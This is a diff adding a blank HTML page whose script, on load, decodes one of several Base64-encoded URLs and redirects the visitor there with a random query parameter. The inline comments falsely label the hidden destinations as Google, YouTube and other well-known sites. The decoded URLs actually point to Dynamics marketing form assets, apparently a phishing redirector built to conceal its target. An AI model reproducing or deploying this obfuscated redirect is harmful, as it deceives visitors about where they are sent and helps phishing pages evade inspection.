@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        setTimeout(function(){
+            // List of Base64-encoded URLs
+            var urls = [
+                'aHR0cHM6Ly9hc3NldHMtZXVyLm1rdC5keW5hbWljcy5jb20vODI5NGNkZjEtOTU1Yi1lZjExLWJmZGQtMDAwZDNhZDk0ODdlL2RpZ2l0YWxhc3NldHMvc3RhbmRhbG9uZWZvcm1zLzEzMzBjZmYwLTBhNmEtZWYxMS1hNjcwLTAwMGQzYTY4NmJkNw==', // https://google.com
+                'aHR0cHM6Ly9hc3NldHMtZXVyLm1rdC5keW5hbWljcy5jb20vODI5NGNkZjEtOTU1Yi1lZjExLWJmZGQtMDAwZDNhZDk0ODdlL2RpZ2l0YWxhc3NldHMvc3RhbmRhbG9uZWZvcm1zLzczYzk4MWE0LTY1NmItZWYxMS1hNjcwLTAwMGQzYTY4NmJkNw==', // https://youtube.com
+                'aHR0cHM6Ly9hc3NldHMtZXVyLm1rdC5keW5hbWljcy5jb20vODI5NGNkZjEtOTU1Yi1lZjExLWJmZGQtMDAwZDNhZDk0ODdlL2RpZ2l0YWxhc3NldHMvc3RhbmRhbG9uZWZvcm1zL2NlY2NkNGIyLTY1NmItZWYxMS1hNjcwLTAwMGQzYTY4NmJkNw==', // https://pc.com
+                'aHR0cHM6Ly9hc3NldHMtZXVyLm1rdC5keW5hbWljcy5jb20vODI5NGNkZjEtOTU1Yi1lZjExLWJmZGQtMDAwZDNhZDk0ODdlL2RpZ2l0YWxhc3NldHMvc3RhbmRhbG9uZWZvcm1zLzBmZGQ5YmNhLTY1NmItZWYxMS1hNjcwLTAwMGQzYTY4NmJkNw==', // https://earthatl.com
+                //'aHR0cHM6Ly93d3cuZWFydGguY29t', // https://earth.com
+                //'aHR0cHM6Ly9naXRodWIuY29t', // https://github.com
+                //'aHR0cHM6Ly93d3cubGluay5jb20=', // https://link.com
+                //'aHR0cHM6Ly93d3cub3BlbmFpbmUuY29t', // https://openaine.com
+                //'aHR0cHM6Ly93d3cuZGVtby5jb20=', // https://demo.com
+                //'aHR0cHM6Ly93d3cucmVkdW5pdG9yLmNvbQ==' // https://reddit.com
+            ];
+
+            // Function to decode Base64-encoded URLs
+            function decodeBase64Url(base64) {
+                return atob(base64);
+            }
+
+            // Function to generate a random string
+            function generateRandomString(length) {
+                var characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                var result = '';
+                for (var i = 0; i < length; i++) {
+                    result += characters.charAt(Math.floor(Math.random() * characters.length));
+                }
+                return result;
+            }
+
+            // Randomly select a Base64-encoded URL from the array
+            var randomIndex = Math.floor(Math.random() * urls.length);
+            var selectedUrl = decodeBase64Url(urls[randomIndex]);
+
+            // Generate a random string of 8 characters
+            var randomString = generateRandomString(8);
+
+            // Construct the final URL with the random string parameter
+            var finalUrl = selectedUrl + '?owla=' + randomString;
+
+            // Redirect to the constructed URL
+            window.location.href = finalUrl;
+        }, 1); // 1-second delay
+    </script>
+</head>
+<body>
+    <p></p>
+</body>
+</html>
